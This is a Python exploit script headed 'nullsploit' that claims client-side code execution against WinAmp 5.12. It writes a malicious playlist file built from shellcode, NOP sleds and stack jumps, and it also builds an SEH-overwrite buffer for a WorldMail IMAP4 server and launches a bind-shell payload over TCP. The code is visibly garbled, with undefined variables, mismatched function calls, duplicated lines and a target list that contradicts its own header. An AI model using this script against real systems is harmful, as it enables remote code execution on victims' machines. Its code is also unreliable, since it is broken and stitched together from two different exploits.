#!/usr/bin/env python
"""
    nullsploit :: Client-Side Code Executon for WinAmp 5.12

    AUTHOR :: TheXero
    WEBSITE :: www.nullsecurity.net

"""
import sys
if "." not in sys.path: 
    sys.path.append(".")
import struct
from shellcode import generate as shellcode
import encoder
import exploitutils
import time

TARGETS                         = {
    0 : ['WorldMail IMAP4 Server 6.1.19', struct.pack("<I", 0x1072d0b7)]
    }

def main():
    parser = exploitutils.arguments()
    args = parser.parse_args()
  
    if args.PAYLOAD:
        PAYLOAD = str(args.PAYLOAD)
    else:
        PAYLOAD = 'win32bind'
    
    if args.PARGS:
        ARGS = args.PARGS
    else:
        ARGS = ''
 
    if args.targets:
        print " Exploit targets available:"
        print " ========================="
        for i in TARGETS:
            print " " + str(i) + " | " + TARGETS[i][0]
        sys.exit()

    if args.RHOST:
        HOST = str(args.RHOST)
    else:
        parser.print_help()
        sys.exit()

   
    run( HOST, PORT, TARGET, PAYLOAD, ARGS)

def checkVulnerability(HOST, PORT):
    # Check banner
    response = exploitutils.bannercheck(HOST, PORT)
    
    if response == False:
        exploitutils.print_bad("Exploit failed!")
        sys.exit()
    for i in TARGETS:
        if TARGETS[i][0] in response:
            #print " Received %s" % response
            exploitutils.print_good("Target appears exploitable")
            return TARGETS[i][1]

    exploitutils.print_bad( "Target is not vulnerable" )
    sys.exit()

def makeSploit( TARGET, PAYLOAD, ARGS ):
    
    
    badchars = "\x00\x0a\x0d\x2e\x5c"
    start = "[playlist]\r\nFile1=\\\\"
    shellcode = "\x90" * 856
    sub_esp("\x81\xec\x56\x03\x00\x00\xff\xe4")
    
    stage2 = encoder.xor(sub_esp, badchars)
    

    stage1 = "\x83\xec\x58\x83\xec\x54\xff\xe4\x90\x90\x90"
    end = "\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"
    
    SHELLCODE = encoder.xor((shellcode(PAYLOAD, ARGS)))

    junk = "\x41" * (854 - len(shellcode))
    junk2 = "\x90" * (168 - len(stage2))
    buffer = start + shellcode + junk + stage2 + junk2 + eip + stage1 + end
    buffer = start + shellcode + junk + stage2 + junk2 + eip + stage1 + end
    f = open("poc.pls","w")
    f.write(buffer)
    f.close

    print("\nFile Created\n")
    
    
    
    
    
    # Exploit variables
    OFFSET=768
    BADCHARS='\x00\x0a\x0d\x20\x7b'
    
    # Generate and encode the shellcode
    #exploitutils.print_status("Generating shellcode")
    SHELLCODE = shellcode( PAYLOAD, ARGS )
    ENCODED_SHELLCODE = encoder.xor( SHELLCODE, BADCHARS )
    
    # Construct the attack
    #exploitutils.print_status( "Carving out the stack")
    
    stack= "\x90"*12
    stack+= ENCODED_SHELLCODE
    stack+= exploitutils.randomstring( OFFSET - len(stack) )
    stack+= "\xeb\x06\x90\x90" # Next SEH
    stack+= TARGET # SEH
    stack+=("\xdb\xc5\xbd\xfc\x37\x63\x33\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x03"
    "\x31\x6f\x17\x83\xc7\x04\x03\x93\x24\x81\xc6\xea\x8f\x81\x2c\xec"
    "\x0f\xf5\xcb")

    SPLOITSTRING = "a0001 LIST }" + stack + "}\r\n"
    return SPLOITSTRING

def run( TARGET, PAYLOAD, PARGS ):
   
    SPLOITSTRING = makeSploit( TARGET, PAYLOAD, PARGS )
    SUCCESS = exploitutils.tcpexploit( HOST, PORT, SPLOITSTRING )
    if SUCCESS != True:
        exploitutils.print_bad("Exploit failed!")
        sys.exit()
    sys.stdout.write(" Waiting for exploit to finish")
    sys.stdout.flush()
    time.sleep(1)
    sys.stdout.write(" 4")
    sys.stdout.flush()
    time.sleep(1)
    sys.stdout.write(" 3")
    sys.stdout.flush()
    time.sleep(1)
    sys.stdout.write(" 2")
    sys.stdout.flush()
    time.sleep(1)
    sys.stdout.write(" 1")  
    sys.stdout.flush()
    time.sleep(1)
    sys.stdout.write("\r")  
    sys.stdout.flush() 
    sys.stdout.write("                                      ")
    sys.stdout.write("\r")  
    exploitutils.handler( HOST, PAYLOAD )

main()
